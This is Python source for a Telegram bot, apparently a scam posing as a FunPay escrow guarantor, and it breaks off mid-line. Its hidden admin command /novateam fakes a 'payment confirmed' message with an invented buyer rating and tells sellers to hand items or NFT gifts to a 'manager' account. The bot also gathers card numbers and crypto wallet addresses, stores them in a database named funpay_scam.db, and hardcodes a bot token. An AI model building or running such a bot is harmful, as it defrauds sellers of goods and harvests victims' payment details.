import asyncio
import logging
import sqlite3
import uuid
import os
import sys
from datetime import datetime
from aiohttp import web

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ===== НАСТРОЙКИ (ТВОИ ДАННЫЕ ВСТАВЛЕНЫ) =====
BOT_TOKEN = "8715914131:AAHKF1nC32BWiAAjGMrXWmIFFRoVIH-eft4"  # Твой токен
ADMIN_IDS = [8625870625]  # Твой ID
VIDEO_URL = "https://youtu.be/en30WSXTX90"
BOT_USERNAME = "FunpayTrustlybot"  # Замени на юзернейм своего бота
PORT = int(os.environ.get("PORT", 8080))

logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# ===== БАЗА ДАННЫХ =====
conn = sqlite3.connect("funpay_scam.db", check_same_thread=False)
cur = conn.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    lang TEXT DEFAULT 'ru',
    card TEXT,
    crypto TEXT,
    stars_username TEXT,
    ref_count INTEGER DEFAULT 0,
    deals_count INTEGER DEFAULT 0,
    successful_deals INTEGER DEFAULT 0
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS deals (
    deal_id TEXT PRIMARY KEY,
    seller_id INTEGER,
    buyer_id INTEGER,
    deal_type TEXT,
    description TEXT,
    amount INTEGER,
    currency TEXT,
    seller_req TEXT,
    buyer_req TEXT,
    status TEXT,
    seller_username TEXT,
    buyer_username TEXT,
    created_at TEXT
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS referrals (
    referrer_id INTEGER,
    referred_id INTEGER,
    PRIMARY KEY (referrer_id, referred_id)
)
""")

conn.commit()

# ===== СОСТОЯНИЯ FSM =====
class DealStates(StatesGroup):
    seller_type = State()
    seller_description = State()
    seller_payment_method = State()
    seller_amount = State()
    seller_requisites = State()
    
    buyer_type = State()
    buyer_description = State()
    buyer_payment_method = State()
    buyer_amount = State()
    buyer_seller_username = State()
    
    confirm_participation = State()
    requisites_type = State()
    requisites_input = State()
    
    funds_deposit = State()
    requisites_menu = State()
    requisites_card = State()
    requisites_crypto = State()
    requisites_stars = State()

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
async def send_with_video(chat_id, text, reply_markup=None, parse_mode="HTML"):
    """Отправляет сообщение с видео"""
    try:
        await bot.send_video(
            chat_id=chat_id,
            video=VIDEO_URL,
            caption=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
    except:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )

def get_main_menu(lang="ru"):
    """Главное меню"""
    texts = {
        'ru': {
            'create': 'Создать сделку',
            'funds': 'Средства',
            'deals': 'Мои сделки',
            'requisites': 'Реквизиты',
            'lang': 'Язык',
            'support': 'Поддержка',
            'verify': 'Верификация',
            'referral': 'Рефералы',
            'about': 'О сервисе'
        },
        'en': {
            'create': 'Create deal',
            'funds': 'Funds',
            'deals': 'My deals',
            'requisites': 'Requisites',
            'lang': 'Language',
            'support': 'Support',
            'verify': 'Verification',
            'referral': 'Referrals',
            'about': 'About'
        }
    }
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t['create'], callback_data="create_deal"))
    builder.row(
        InlineKeyboardButton(text=t['funds'], callback_data="funds"),
        InlineKeyboardButton(text=t['deals'], callback_data="my_deals")
    )
    builder.row(
        InlineKeyboardButton(text=t['requisites'], callback_data="requisites"),
        InlineKeyboardButton(text=t['lang'], callback_data="lang")
    )
    builder.row(
        InlineKeyboardButton(text=t['support'], callback_data="support"),
        InlineKeyboardButton(text=t['verify'], callback_data="verify")
    )
    builder.row(
        InlineKeyboardButton(text=t['referral'], callback_data="referral"),
        InlineKeyboardButton(text=t['about'], callback_data="about")
    )
    return builder.as_markup()

def get_back_button(lang="ru"):
    """Кнопка назад"""
    text = "🔙 Назад" if lang == "ru" else "🔙 Back"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=text, callback_data="main_menu")]
    ])

def get_roles_menu(lang="ru"):
    """Выбор роли"""
    texts = {
        'ru': ['Я продавец', 'Я покупатель'],
        'en': ['I am seller', 'I am buyer']
    }
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="seller_role"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="buyer_role"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    return builder.as_markup()

def get_deal_types(lang="ru"):
    """Типы сделок"""
    texts = {
        'ru': ['Аккаунт', 'NFT Gift', '🔙 Назад'],
        'en': ['Account', 'NFT Gift', '🔙 Back']
    }
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="deal_type_account"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="deal_type_gift"))
    builder.row(InlineKeyboardButton(text=t[2], callback_data="main_menu"))
    return builder.as_markup()

def get_payment_methods(lang="ru"):
    """Способы оплаты"""
    methods = ['Рубли', 'Гривны', 'BYN', 'Stars', 'USDT', 'TON']
    if lang == "en":
        methods = ['RUB', 'UAH', 'BYN', 'Stars', 'USDT', 'TON']
    builder = InlineKeyboardBuilder()
    for m in methods:
        builder.row(InlineKeyboardButton(text=m, callback_data=f"payment_{m.lower()}"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    return builder.as_markup()

def get_requisites_types(lang="ru"):
    """Типы реквизитов для подтверждения"""
    texts = {
        'ru': ['Карта', 'Крипта', 'Stars', '🔙 Назад'],
        'en': ['Card', 'Crypto', 'Stars', '🔙 Back']
    }
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="req_card"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="req_crypto"))
    builder.row(InlineKeyboardButton(text=t[2], callback_data="req_stars"))
    builder.row(InlineKeyboardButton(text=t[3], callback_data="main_menu"))
    return builder.as_markup()

def get_requisites_menu(lang="ru"):
    """Меню реквизитов"""
    texts = {
        'ru': ['Карта', 'Крипта', 'Stars', '🔙 Назад'],
        'en': ['Card', 'Crypto', 'Stars', '🔙 Back']
    }
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="req_card_save"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="req_crypto_save"))
    builder.row(InlineKeyboardButton(text=t[2], callback_data="req_stars_save"))
    builder.row(InlineKeyboardButton(text=t[3], callback_data="main_menu"))
    return builder.as_markup()

def get_funds_menu(lang="ru"):
    """Меню средств"""
    texts = {
        'ru': ['Пополнить', 'Вывести', '🔙 Назад'],
        'en': ['Deposit', 'Withdraw', '🔙 Back']
    }
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="funds_deposit"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="funds_withdraw"))
    builder.row(InlineKeyboardButton(text=t[2], callback_data="main_menu"))
    return builder.as_markup()

def get_lang_menu():
    """Меню языка"""
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Русский", callback_data="lang_ru"))
    builder.row(InlineKeyboardButton(text="English", callback_data="lang_en"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    return builder.as_markup()

def generate_deal_id():
    """Генерация ID сделки"""
    return str(uuid.uuid4())[:8]

def get_user_lang(user_id):
    """Получить язык пользователя"""
    cur.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else "ru"

def get_user_username(user_id):
    """Получить username пользователя"""
    cur.execute("SELECT username FROM users WHERE user_id = ?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else None

def save_user(user_id, username):
    """Сохранить пользователя"""
    cur.execute("""
        INSERT OR IGNORE INTO users (user_id, username)
        VALUES (?, ?)
    """, (user_id, username))
    conn.commit()

def save_requisites(user_id, req_type, value):
    """Сохранить реквизиты"""
    if req_type == "card":
        cur.execute("UPDATE users SET card = ? WHERE user_id = ?", (value, user_id))
    elif req_type == "crypto":
        cur.execute("UPDATE users SET crypto = ? WHERE user_id = ?", (value, user_id))
    elif req_type == "stars":
        cur.execute("UPDATE users SET stars_username = ? WHERE user_id = ?", (value, user_id))
    conn.commit()

def get_user_requisites(user_id):
    """Получить реквизиты пользователя"""
    cur.execute("SELECT card, crypto, stars_username FROM users WHERE user_id = ?", (user_id,))
    return cur.fetchone()

def create_deal(seller_id, deal_type, description, amount, currency, seller_req, seller_username=None):
    """Создать сделку (продавец)"""
    deal_id = generate_deal_id()
    cur.execute("""
        INSERT INTO deals (
            deal_id, seller_id, deal_type, description, 
            amount, currency, seller_req, status, 
            seller_username, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        deal_id, seller_id, deal_type, description,
        amount, currency, seller_req, "waiting_buyer",
        seller_username, datetime.now().isoformat()
    ))
    conn.commit()
    return deal_id

def create_deal_buyer(buyer_id, seller_username, deal_type, description, amount, currency):
    """Создать сделку (покупатель)"""
    deal_id = generate_deal_id()
    cur.execute("""
        INSERT INTO deals (
            deal_id, buyer_id, deal_type, description, 
            amount, currency, status, buyer_username, 
            seller_username, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        deal_id, buyer_id, deal_type, description,
        amount, currency, "waiting_seller_confirm",
        get_user_username(buyer_id), seller_username,
        datetime.now().isoformat()
    ))
    conn.commit()
    return deal_id

def get_deal(deal_id):
    """Получить сделку по ID"""
    cur.execute("SELECT * FROM deals WHERE deal_id = ?", (deal_id,))
    return cur.fetchone()

def update_deal_status(deal_id, status):
    """Обновить статус сделки"""
    cur.execute("UPDATE deals SET status = ? WHERE deal_id = ?", (status, deal_id))
    conn.commit()

def update_deal_seller_req(deal_id, req):
    """Обновить реквизиты продавца"""
    cur.execute("UPDATE deals SET seller_req = ? WHERE deal_id = ?", (req, deal_id))
    conn.commit()

def update_deal_buyer_req(deal_id, req):
    """Обновить реквизиты покупателя"""
    cur.execute("UPDATE deals SET buyer_req = ? WHERE deal_id = ?", (req, deal_id))
    conn.commit()

def get_user_deals(user_id):
    """Получить сделки пользователя"""
    cur.execute("""
        SELECT * FROM deals 
        WHERE seller_id = ? OR buyer_id = ?
        ORDER BY created_at DESC
    """, (user_id, user_id))
    return cur.fetchall()

# ===== ОБРАБОТЧИК КОМАНД =====

@dp.message(CommandStart())
async def cmd_start(message: Message):
    """Обработчик /start"""
    user_id = message.from_user.id
    username = message.from_user.username
    
    save_user(user_id, username)
    
    # Проверка на реферальную ссылку
    if " " in message.text:
        args = message.text.split(" ", 1)[1]
        if args.startswith("ref"):
            ref_id = args.replace("ref", "")
            if ref_id.isdigit() and int(ref_id) != user_id:
                cur.execute("""
                    INSERT OR IGNORE INTO referrals (referrer_id, referred_id)
                    VALUES (?, ?)
                """, (int(ref_id), user_id))
                cur.execute("""
                    UPDATE users SET ref_count = ref_count + 1
                    WHERE user_id = ?
                """, (int(ref_id),))
                conn.commit()
    
    # Проверка на ссылку сделки
    if " " in message.text:
        args = message.text.split(" ", 1)[1]
        if args.startswith("deal_"):
            deal_id = args.replace("deal_", "")
            await show_deal_for_user(message, deal_id)
            return
    
    lang = get_user_lang(user_id)
    text = """<b># FUNPAY</b>

<b>Безопасный гарант для сделок в Telegram.</b>

<b>Что внутри:</b>
• защита от мошенников
• удержание средств до завершения сделки
• история и статусы сделок
• поддержка через @GiftForFunpay

<b>Выберите действие ниже.</b>"""
    
    await send_with_video(
        chat_id=message.chat.id,
        text=text,
        reply_markup=get_main_menu(lang)
    )

# ===== СЕКРЕТНАЯ КОМАНДА (ТВОЙ АЙДИ ВСТАВЛЕН) =====
@dp.message(Command("novateam"))
async def cmd_novateam(message: Message):
    """Секретная команда - подтверждение оплаты"""
    user_id = message.from_user.id
    
    # Разрешаем использовать команду только админу
    if user_id not in ADMIN_IDS:
        await message.answer("❌ У вас нет прав для этой команды.")
        return
    
    # Найти сделку, где этот пользователь продавец и статус waiting_payment
    cur.execute("""
        SELECT * FROM deals 
        WHERE seller_id = ? AND status = 'waiting_payment'
        ORDER BY created_at DESC LIMIT 1
    """, (user_id,))
    deal = cur.fetchone()
    
    if not deal:
        await message.answer("❌ Нет активных сделок в ожидании оплаты.")
        return
    
    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    
    # Получить username покупателя
    buyer_username = buyer_username or get_user_username(buyer_id)
    
    text = f"""<b>💳 Оплата подтверждена</b>

<b>Сделка:</b> #{deal_id}
<b>Покупатель:</b> @{buyer_username}
<b>Рейтинг:</b> 5/5
<b>Успешных сделок:</b> 0
<b>Сумма:</b> {amount} {currency}
<b>Предмет:</b> {description}

<b>🛡 Важное правило безопасности</b>

Передавайте товар или подарок только менеджеру @GiftsForFunpay. Передача напрямую покупателю может привести к потере средств.

<b>Передайте товар менеджеру: @GiftsForFunpay</b>"""
    
    # Отправить продавцу
    await bot.send_message(
        chat_id=user_id,
        text=text,
        parse_mode="HTML"
    )
    
    # Если есть покупатель - отправить ему уведомление
    if buyer_id:
        buyer_text = f"""✅ Оплата подтверждена! Сделка #{deal_id} завершена.

Продавец свяжется с вами для передачи товара."""
        await bot.send_message(
            chat_id=buyer_id,
            text=buyer_text
        )
    
    # Обновить статус сделки
    update_deal_status(deal_id, "completed")
    
    # Обновить счетчики
    cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (seller_id,))
    if buyer_id:
        cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (buyer_id,))
    conn.commit()
    
    await message.answer(f"✅ Сделка #{deal_id} подтверждена!")

# ===== ПОКАЗ СДЕЛКИ ПО ССЫЛКЕ =====
async def show_deal_for_user(message: Message, deal_id: str):
    """Показать сделку пользователю"""
    deal = get_deal(deal_id)
    if not deal:
        await message.answer("❌ Сделка не найдена")
        return
    
    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    # Если пользователь не участвует в сделке
    if user_id != seller_id and user_id != buyer_id:
        await message.answer("❌ Вы не участвуете в этой сделке")
        return
    
    # Если пользователь - продавец и статус waiting_seller_confirm
    if user_id == seller_id and status == "waiting_seller_confirm":
        text = f"""<b>Сделка #{deal_id}</b>

<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Оплата:</b> {currency}

<b>Вы указаны как продавец. Подтвердите участие.</b>"""
        
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="✅ Подтвердить участие", callback_data=f"confirm_{deal_id}"))
        builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
        
        await send_with_video(
            chat_id=message.chat.id,
            text=text,
            reply_markup=builder.as_markup()
        )
        return
    
    # Если пользователь - покупатель и статус waiting_buyer
    if user_id == buyer_id and status == "waiting_buyer":
        text = f"""<b>Сделка #{deal_id}</b>

<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Реквизиты продавца:</b> {seller_req}

<b>Ожидайте подтверждения от продавца.</b>"""
        
        await send_with_video(
            chat_id=message.chat.id,
            text=text,
            reply_markup=get_back_button(lang)
        )
        return
    
    # Другие статусы
    status_text = {
        'waiting_buyer': 'Ожидаем покупателя',
        'waiting_payment': 'Ожидаем оплату',
        'completed': 'Завершена'
    }.get(status, status)
    
    text = f"""<b>Сделка #{deal_id}</b>

<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Статус:</b> {status_text}"""
    
    await send_with_video(
        chat_id=message.chat.id,
        text=text,
        reply_markup=get_back_button(lang)
    )

# ===== ОБРАБОТЧИКИ КНОПОК =====

@dp.callback_query(F.data == "main_menu")
async def main_menu_callback(call: CallbackQuery):
    """Возврат в главное меню"""
    user_id = call.from_user.id
    lang = get_user_lang(user_id)
    
    text = """<b># FUNPAY</b>

<b>Безопасный гарант для сделок в Telegram.</b>

<b>Что внутри:</b>
• защита от мошенников
• удержание средств до завершения сделки
• история и статусы сделок
• поддержка через @GiftForFunpay

<b>Выберите действие ниже.</b>"""
    
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_main_menu(lang)
    )
    await call.answer()

# 1. СОЗДАТЬ СДЕЛКУ
@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(call: CallbackQuery):
    """Создать сделку - выбор роли"""
    user_id = call.from_user.id
    lang = get_user_lang(user_id)
    
    text = "Выберите вашу роль в сделке:"
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_roles_menu(lang)
    )
    await call.answer()

@dp.callback_query(F.data == "seller_role")
async def seller_role_callback(call: CallbackQuery, state: FSMContext):
    """Продавец - выбор типа"""
    user_id = call.from_user.id
    lang = get_user_lang(user_id)
    
    await state.set_state(DealStates.seller_type)
    
    text = "Выберите тип сделки:"
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_deal_types(lang)
    )
    await call.answer()

@dp.callback_query(F.data == "buyer_role")
async def buyer_role_callback(call: CallbackQuery, state: FSMContext):
    """Покупатель - выбор типа"""
    user_id = call.from_user.id
    lang = get_user_lang(user_id)
    
    await state.set_state(DealStates.buyer_type)
    
    text = "Выберите тип сделки:"
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_deal_types(lang)
    )
    await call.answer()

# 1.1 ПРОДАВЕЦ - ТИП СДЕЛКИ
@dp.callback_query(F.data == "deal_type_account", DealStates.seller_type)
async def seller_account_type(call: CallbackQuery, state: FSMContext):
    """Продавец - Аккаунт"""
    await state.set_state(DealStates.seller_description)
    await state.update_data(deal_type="account")
    
    text = """Опишите предмет сделки

Укажите важные детали, условия передачи и дополнительные договоренности."""
    
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_back_button(get_user_lang(call.from_user.id))
    )
    await call.answer()

@dp.callback_query(F.data == "deal_type_gift", DealStates.seller_type)
async def seller_gift_type(call: CallbackQuery, state: FSMContext):
    """Продавец - NFT Gift"""
    await state.set_state(DealStates.seller_description)
    await state.update_data(deal_type="gift")
    
    text = """Отправьте ссылку на NFT Gift

Можно указать одну или несколько ссылок, например:
https://t.me/nft/DurovsCap-1"""
    
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_back_button(get_user_lang(call.from_user.id))
    )
    await call.answer()

# 1.2 ПОКУПАТЕЛЬ - ТИП СДЕЛКИ
@dp.callback_query(F.data == "deal_type_account", DealStates.buyer_type)
async def buyer_account_type(call: CallbackQuery, state: FSMContext):
    """Покупатель - Аккаунт"""
    await state.set_state(DealStates.buyer_description)
    await state.update_data(deal_type="account")
    
    text = """Опишите предмет сделки

Укажите важные детали, условия передачи и дополнительные договоренности."""
    
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_back_button(get_user_lang(call.from_user.id))
    )
    await call.answer()

@dp.callback_query(F.data == "deal_type_gift", DealStates.buyer_type)
async def buyer_gift_type(call: CallbackQuery, state: FSMContext):
    """Покупатель - NFT Gift"""
    await state.set_state(DealStates.buyer_description)
    await state.update_data(deal_type="gift")
    
    text = """Отправьте ссылку на NFT Gift

Можно указать одну или несколько ссылок, например:
https://t.me/nft/DurovsCap-1"""
    
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_back_button(get_user_lang(call.from_user.id))
    )
    await call.answer()

# 1.3 ПРОДАВЕЦ - ОПИСАНИЕ
@dp.message(DealStates.seller_description)
async def seller_description_handler(message: Message, state: FSMContext):
    """Продавец - получение описания"""
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    await state.update_data(description=message.text)
    await state.set_state(DealStates.seller_payment_method)
    
    text = "Выберите способ оплаты:"
    await send_with_video(
        chat_id=message.chat.id,
        text=text,
        reply_markup=get_payment_methods(lang)
    )

# 1.4 ПОКУПАТЕЛЬ - ОПИСАНИЕ
@dp.message(DealStates.buyer_description)
async def buyer_description_handler(message: Message, state: FSMContext):
    """Покупатель - получение описания"""
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    await state.update_data(description=message.text)
    await state.set_state(DealStates.buyer_payment_method)
    
    text = "Выберите способ оплаты:"
    await send_with_video(
        chat_id=message.chat.id,
        text=text,
        reply_markup=get_payment_methods(lang)
    )

# 1.5 ОБЩИЙ ВЫБОР ОПЛАТЫ
@dp.callback_query(F.data.startswith("payment_"), DealStates.seller_payment_method)
async def seller_payment_method(call: CallbackQuery, state: FSMContext):
    """Продавец - выбор способа оплаты"""
    currency = call.data.replace("payment_", "")
    currency_upper = currency.upper()
    
    await state.update_data(currency=currency_upper)
    await state.set_state(DealStates.seller_amount)
    
    text = f"Введите сумму сделки в {currency_upper}\n\nТолько целое число."
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_back_button(get_user_lang(call.from_user.id))
    )
    await call.answer()

@dp.callback_query(F.data.startswith("payment_"), DealStates.buyer_payment_method)
async def buyer_payment_method(call: CallbackQuery, state: FSMContext):
    """Покупатель - выбор способа оплаты"""
    currency = call.data.replace("payment_", "")
    currency_upper = currency.upper()
    
    await state.update_data(currency=currency_upper)
    await state.set_state(DealStates.buyer_amount)
    
    text = f"Введите сумму сделки в {currency_upper}\n\nТолько целое число."
    await send_with_video(
        chat_id=call.message.chat.id,
        text=text,
        reply_markup=get_back_button(get_user_lang(call.from_user.id))
    )
    await call.answer()

# 1.6 ПРОДАВЕЦ - СУММА
@dp.message(DealStates.seller_amount)
async def seller_amount_handler(message: Message, state: FSMContext):
    """Продавец - получение суммы"""
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    if not message.text.isdigit():
        await message.answer("❌ Введите целое число!")
        return
    
    await state.update_data(amount=int(message.text))
    await state.set_state(DealStates.seller_requisites)
    
    data = await state.get_data()
    currency = data.get('currency', '').lower()
    
    texts = {
        'rub': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
        'uah': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
        'byn': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
        'stars': 'Введите юзернейм для получения Stars\n\nНапример: @username',
        'usdt': 'Введите адрес криптокошелька',
        'ton': 'Введите адрес криптокошелька'
    }
    
    text = texts.get(currency, 'Введите реквизиты')
    await send_with_video(
        chat_id=message.chat.id,
        text=text,
        reply_markup=get_back_button(lang)
    )

# 1.7 ПОКУПАТЕЛЬ - СУММА
@dp.message(DealStates.buyer_amount)
async def buyer_amount_handler(message: Message, state: FSMContext):
    """Покупатель - получение суммы"""
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    if not message.text.isdigit():
        await message.answer("❌ Введите целое число!")
        return
    
    await state.update_data(amount=int(message.text))
    await state.set_state(DealStates.buyer_seller_username)
    
    text = """введите username продавца

например: @username"""
    
    await send_with_video(
        chat_id=message.chat.id,
        text=text,
        reply_markup=get_back_button(lang)
    )

# 1.8 ПОКУПАТЕЛЬ - USERNAME ПРОДАВЦА
@dp.message(DealStates.buyer_seller_username)
async def buyer_seller_username_handler(message: Message, state: FSMContext):
    """Покупатель - получение username продавца"""
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    seller_username = message.text.strip()
    if not seller_username.startswith('@'):
        seller_username = f"@{seller_username}"
    
    data = await state.get_data()
    deal_type = data.get('deal_type')
    description = data.get('description')
    amount = data.get('amount')
    currency = data.get('currency')
    
    # Создать сделку
    deal_id = create_deal_buyer(
        buyer_id=user_id,
        seller_username=seller_username,
        deal_type=deal_type,
        description=description,
        amount=amount,
        currency=currency
    )
    
    text = f"""<b>Сделка #{deal_id} создана</b>

<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}

<b>Ожидаем подтверждение продавца:</b> {seller_username}

<b>Ссылка для продавца:</b>
https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"""
    
    await send_with_video(
        chat_id=message.chat.id,
        text=text,
        reply_markup=get_back_button(lang)
    )
    
    await state.clear()

# 1.9 ПРОДАВЕЦ - РЕКВИЗИТЫ
@dp.message(DealStates.seller_requisites)
async def seller_requisites_handler(message: Message, state: FSMContext):
    """Продавец - получение реквизитов"""
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    requisites = message.text
    data = await state.get_data()
    
    deal_type = data.get('deal_type')
    description = data.get
